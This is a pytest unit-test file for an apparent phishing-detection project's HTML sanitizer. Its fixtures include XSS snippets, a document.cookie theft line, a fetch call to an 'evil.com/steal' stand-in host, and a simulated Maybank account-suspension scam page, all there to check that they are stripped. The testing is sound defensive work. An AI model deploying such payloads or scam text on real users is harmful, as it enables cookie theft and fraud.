"""
PhishGuard-AI — Sanitizer Unit Tests.
=======================================

Tests the DOM sanitization ETL pipeline (``services.sanitizer.sanitize_dom``).
"""

import pytest
from services.sanitizer import sanitize_dom


class TestSanitizeDom:
    """Unit tests for the ``sanitize_dom()`` function."""

    def test_strips_script_tags(self) -> None:
        html = "<html><body><script>alert('xss')</script><p>Hello</p></body></html>"
        result = sanitize_dom(html)
        assert "alert" not in result
        assert "Hello" in result

    def test_strips_style_tags(self) -> None:
        html = "<html><head><style>body{color:red}</style></head><body><p>Content</p></body></html>"
        result = sanitize_dom(html)
        assert "color" not in result
        assert "Content" in result

    def test_strips_noscript_tags(self) -> None:
        html = "<html><body><noscript>Enable JS</noscript><p>Visible</p></body></html>"
        result = sanitize_dom(html)
        assert "Enable JS" not in result
        assert "Visible" in result

    def test_strips_iframe_tags(self) -> None:
        html = '<html><body><iframe src="evil.com"></iframe><p>Safe</p></body></html>'
        result = sanitize_dom(html)
        assert "evil.com" not in result
        assert "Safe" in result

    def test_strips_svg_tags(self) -> None:
        html = "<html><body><svg><circle/></svg><p>Text</p></body></html>"
        result = sanitize_dom(html)
        assert "circle" not in result
        assert "Text" in result

    def test_strips_meta_and_link_tags(self) -> None:
        html = '<html><head><meta name="x"><link rel="stylesheet"></head><body>OK</body></html>'
        result = sanitize_dom(html)
        assert "OK" in result

    def test_whitespace_normalization(self) -> None:
        html = "<html><body><p>  Hello   World  </p></body></html>"
        result = sanitize_dom(html)
        assert result == "Hello World"

    def test_multiline_whitespace_collapse(self) -> None:
        html = "<html><body><p>Line1</p>\n\n\n<p>Line2</p></body></html>"
        result = sanitize_dom(html)
        assert "  " not in result  # No double spaces
        assert "Line1" in result
        assert "Line2" in result

    def test_preserves_visible_text(self) -> None:
        html = """
        <html><body>
            <h1>Welcome to Maybank</h1>
            <p>Please verify your account details.</p>
            <div>Contact us at support@maybank.com</div>
        </body></html>
        """
        result = sanitize_dom(html)
        assert "Welcome to Maybank" in result
        assert "verify your account" in result
        assert "support@maybank.com" in result

    def test_empty_html_returns_empty_string(self) -> None:
        result = sanitize_dom("")
        assert result == ""

    def test_purely_structural_html_returns_empty(self) -> None:
        html = "<html><head><meta charset='utf-8'></head><body></body></html>"
        result = sanitize_dom(html)
        assert result == ""

    def test_complex_phishing_dom(self) -> None:
        """Simulates a real phishing page with scripts, styles, and social engineering text."""
        html = """
        <html>
        <head>
            <style>.urgent{color:red;font-size:24px}</style>
            <script>document.cookie='stolen'</script>
        </head>
        <body>
            <div class="urgent">
                <h1>⚠ URGENT: Your Maybank Account Will Be Suspended!</h1>
                <p>Transfer RM500 immediately to account 112233445566 to avoid suspension.</p>
                <script>fetch('https://evil.com/steal')</script>
            </div>
        </body>
        </html>
        """
        result = sanitize_dom(html)
        assert "URGENT" in result
        assert "112233445566" in result
        assert "document.cookie" not in result
        assert "fetch" not in result
        assert "color:red" not in result

    def test_large_payload_does_not_crash(self) -> None:
        """Ensure sanitization handles large payloads without errors."""
        html = "<html><body>" + "<p>Data</p>" * 10_000 + "</body></html>"
        result = sanitize_dom(html)
        assert len(result) > 0
